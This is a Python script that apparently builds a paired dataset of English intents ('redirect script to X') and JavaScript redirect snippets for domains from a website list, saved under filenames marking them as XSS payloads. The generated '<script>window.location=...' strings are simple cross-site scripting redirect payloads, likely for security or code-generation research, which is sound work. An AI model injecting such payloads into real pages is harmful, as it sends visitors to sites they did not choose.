intent_arr_pre = ['redirect script to ?', 'script redirect to ?', 'redirect to ?']
websites = []
intent_arr = []
snippet_arr = []
file_to_list = []
filename = 'websites-1000.txt'
with open(filename) as f:
    file_to_list = f.read().splitlines()
for i in range(len(file_to_list)):
    line = str(file_to_list[i])
    if 'https://www.' in line:
        line = line.replace('https://www.', '')
    if 'http://www.' in line:
        line = line.replace('http://www.', '')
    split_str = line.split('.', 1)
    #print(split_str[0])
    websites.append(split_str[0])
for i in range(9): #len(websites)
    website = websites[i]
    dot_com = website + '.com'
    dot_edu = website + '.edu'
    dot_net = website + '.net'
    dot_org = website + '.org'
    dot_tv = website + '.tv'
    dot_info = website + '.info'
    dot_co = website + '.co'
    dot_gov = website + '.gov'
    for j in range(len(intent_arr_pre)):
        intent_val = intent_arr_pre[j]
        snippet_val = '<script>window.location="https://www.?"</script>'
        intent_arr.append(intent_val.replace('?', website))
        snippet_arr.append(snippet_val.replace('?', website+'.com'))

        intent_val = intent_arr_pre[j]
        snippet_val = '<script>window.location="https://www.?"</script>'
        intent_arr.append(intent_val.replace('?', dot_com))
        snippet_arr.append(snippet_val.replace('?', dot_com))

        intent_val = intent_arr_pre[j]
        snippet_val = '<script>window.location="https://www.?"</script>'
        intent_arr.append(intent_val.replace('?', dot_net))
        snippet_arr.append(snippet_val.replace('?', dot_net))

        intent_val = intent_arr_pre[j]
        snippet_val = '<script>window.location="https://www.?"</script>'
        intent_arr.append(intent_val.replace('?', dot_org))
        snippet_arr.append(snippet_val.replace('?', dot_org))

        intent_val = intent_arr_pre[j]
        snippet_val = '<script>window.location="https://www.?"</script>'
        intent_arr.append(intent_val.replace('?', dot_tv))
        snippet_arr.append(snippet_val.replace('?', dot_tv))

        intent_val = intent_arr_pre[j]
        snippet_val = '<script>window.location="https://www.?"</script>'
        intent_arr.append(intent_val.replace('?', dot_info))
        snippet_arr.append(snippet_val.replace('?', dot_info))

        intent_val = intent_arr_pre[j]
        snippet_val = '<script>window.location="https://www.?"</script>'
        intent_arr.append(intent_val.replace('?', dot_co))
        snippet_arr.append(snippet_val.replace('?', dot_co))

        intent_val = intent_arr_pre[j]
        snippet_val = '<script>window.location="https://www.?"</script>'
        intent_arr.append(intent_val.replace('?', dot_gov))
        snippet_arr.append(snippet_val.replace('?', dot_gov))


if len(intent_arr) == len(snippet_arr):
    with open("intent-xss-low.txt", "w") as output:
        output.writelines("%s\n" % i for i in intent_arr)
    with open("snippet-xss-low.txt", "w") as output:
        output.writelines("%s\n" % i for i in snippet_arr)
else:
    print('intents and snippets are not the same size')